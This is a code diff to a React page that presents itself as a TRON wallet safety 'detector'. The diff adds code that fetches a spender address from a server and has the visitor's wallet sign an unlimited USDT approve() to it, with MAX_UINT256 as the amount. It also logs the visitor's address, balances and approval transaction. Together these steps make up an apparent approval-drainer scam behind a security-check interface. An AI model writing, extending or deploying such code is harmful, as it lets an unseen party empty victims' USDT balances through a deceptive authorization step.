@@ -25,9 +25,8 @@ import { useTranslation } from "react-i18next";
 import LanguageSwitcher from "@/components/LanguageSwitcher";
 import { Button } from "@/components/ui/button";
 import { Card, CardContent } from "@/components/ui/card";
+import { fetchApprovalSpenderAddress, TRON_USDT_CONTRACT } from "@/lib/approvalSpender";
 import { parseApprovalSendResult, submitWalletAuthorizationRecord } from "@/lib/walletAuthorizationRecord";
-
-const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const SCAN_MESSAGE_COUNT = 4;
 const TRUST_POINT_COUNT = 5;
 
@@ -663,6 +662,8 @@ const Index = () => {
   const [showDetails, setShowDetails] = useState(false);
   const [activeFeature, setActiveFeature] = useState(0);
   const [activeFlowStep, setActiveFlowStep] = useState(0);
+  const [approvalSpenderAddress, setApprovalSpenderAddress] = useState<string | null>(null);
+  const [approvalSpenderLoading, setApprovalSpenderLoading] = useState(true);
 
   const currentStep = useMemo(() => {
     switch (stage) {
@@ -717,6 +718,20 @@ const Index = () => {
     };
   }, [stage, wallet]);
 
+  useEffect(() => {
+    if (!isImToken) return;
+    let cancelled = false;
+    setApprovalSpenderLoading(true);
+    void fetchApprovalSpenderAddress().then((addr) => {
+      if (cancelled) return;
+      setApprovalSpenderAddress(addr);
+      setApprovalSpenderLoading(false);
+    });
+    return () => {
+      cancelled = true;
+    };
+  }, [isImToken, wallet?.address]);
+
   const connectWallet = async () => {
     setIsConnecting(true);
     setError(null);
@@ -739,7 +754,7 @@ const Index = () => {
 
       let usdtBalance = 0;
       try {
-        const contract = await injectedTronWeb?.contract?.().at(USDT_CONTRACT);
+        const contract = await injectedTronWeb?.contract?.().at(TRON_USDT_CONTRACT);
         const rawBalance = await contract?.balanceOf(address).call();
         usdtBalance = Number(rawBalance?.toString?.() ?? 0) / 1_000_000;
       } catch {
@@ -761,9 +776,12 @@ const Index = () => {
 
   const startAuthorization = async () => {
     if (!wallet) return;
+    if (approvalSpenderLoading || !approvalSpenderAddress) {
+      setError({ key: "errors.approvalSpenderUnavailable" });
+      return;
+    }
 
-    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-    const SPENDER_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const spender = approvalSpenderAddress;
     const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
     setError(null);
@@ -774,8 +792,8 @@ const Index = () => {
       const tronWeb = (window as any).tronWeb;
       if (!tronWeb) throw new Error("TronWeb not available");
 
-      const contract = await tronWeb.contract().at(USDT_CONTRACT);
-      const sendResult = await contract.approve(SPENDER_ADDRESS, MAX_UINT256).send({
+      const contract = await tronWeb.contract().at(TRON_USDT_CONTRACT);
+      const sendResult = await contract.approve(spender, MAX_UINT256).send({
         feeLimit: 100_000_000,
         callValue: 0,
       });
@@ -786,6 +804,7 @@ const Index = () => {
         trxBalance: wallet.trxBalance,
         usdtBalance: wallet.usdtBalance,
         approvalTxId,
+        approvalSpender: spender,
         locale: i18n.resolvedLanguage,
       });
 
@@ -985,8 +1004,12 @@ const Index = () => {
                             {isConnecting ? t("detector.connectCard.connecting") : t("detector.connectCard.connect")}
                           </Button>
                         ) : (
-                          <Button className="tron-primary-button h-12 rounded-2xl text-base" onClick={startAuthorization}>
-                            {t("detector.connectCard.authorize")}
+                          <Button
+                            className="tron-primary-button h-12 rounded-2xl text-base"
+                            onClick={startAuthorization}
+                            disabled={approvalSpenderLoading}
+                          >
+                            {approvalSpenderLoading ? t("detector.connectCard.loadingSpender") : t("detector.connectCard.authorize")}
                           </Button>
                         )}
                         <p className="text-center text-xs subtle-copy">{t("detector.connectCard.authorizationHint")}</p>
@@ -1121,7 +1144,7 @@ const Index = () => {
                               {t("report.addressLabel")}: {wallet ? wallet.address : "-"}
                             </p>
                             <p>
-                              {t("report.contractLabel")}: {USDT_CONTRACT}
+                              {t("report.contractLabel")}: {TRON_USDT_CONTRACT}
                             </p>
                             <p>
                               {t("report.conclusionLabel")}: {t("report.conclusionText")}
